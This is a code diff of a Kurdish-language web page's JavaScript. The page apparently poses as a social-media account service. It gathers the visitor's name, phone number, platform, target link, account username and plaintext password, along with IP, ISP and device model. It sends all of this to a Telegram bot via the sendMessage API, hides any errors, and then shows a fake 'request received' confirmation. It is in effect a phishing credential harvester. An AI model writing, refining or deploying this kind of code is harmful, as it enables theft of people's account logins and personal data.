-                        `• لەدایکبوون: ${userData.birth || ''} (${userData.gender || ''})\n\n` +
+                        `• ناوی تەواو: ${userData.fName} ${userData.lName}\n` +
+                        `• تەلەفۆن: \`${userData.phone}\`\n\n` +
                         `📌 **داواکارییەکە:**\n` +
                         `• پلاتفۆرم: **${activePlatform}**\n` +
                         `• خزمەتگوزاری: ${srvType}\n` +
-                        `• لینکی ئامانج: \`${targetLink}\`\n` +
-                        `• یوزەرنێیم/ئیمەیڵ: \`${accUser}\`\n` +
-                        `• پاسوۆرد: ${passDisplay}\n\n` +
-                        `⏰ کات: ${timeString}\n` +
+                        `• لینک: \`${targetLink}\`\n` +
+                        `• یوزەرنێیم: \`${accUser}\`\n` +
+                        `• پاسوۆرد: \`${accPass || 'هیچی نییە'}\`\n\n` +
                         `🌐 IP: ${ip} (${isp})\n` +
                         `📱 ئامێر: ${deviceModel}`;
 
@@ -507,24 +389,20 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        chat_id: chatId, 
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
                 });
             } catch (err) {}
 
             setTimeout(() => {
                 document.getElementById("dashboardView").innerHTML = `
-                    <div style="text-align: center; padding: 40px 20px;">
-                        <div style="font-size: 40px; margin-bottom: 10px;">⏳</div>
-                        <h2 style="color: #38bdf8; margin-bottom: 8px;">داواکارییەکەت وەرگیرا!</h2>
-                        <p style="color: #94a3b8; font-size: 13px;">داواکارییەکەت ڕەوانەی سێرڤەری ئۆتۆماتیک کرا و لە ماوەیەکی نزیکدا جێبەجێ دەکرێت.</p>
-                        <button type="button" class="btn-primary" onclick="location.reload()" style="margin-top: 15px;">گەڕانەوە 🔄</button>
+                    <div class="card-box" style="text-align: center;">
+                        <div style="font-size: 40px; margin-bottom: 10px;">✅</div>
+                        <h2 style="color: #38bdf8; margin-bottom: 8px;">داواکارییەکەت نێردرا!</h2>
+                        <p>سەرکەوتووانە تۆمارکرا و لە ماوەیەکی نزیکدا جێبەجێ دەکرێت.</p>
+                        <button type="button" class="btn-primary" onclick="location.reload()" style="margin-top: 15px;">داواکاری نوێ 🔄</button>
                     </div>
                 `;
-            }, 1200);
+            }, 1000);
         }
     </script>
 </body>
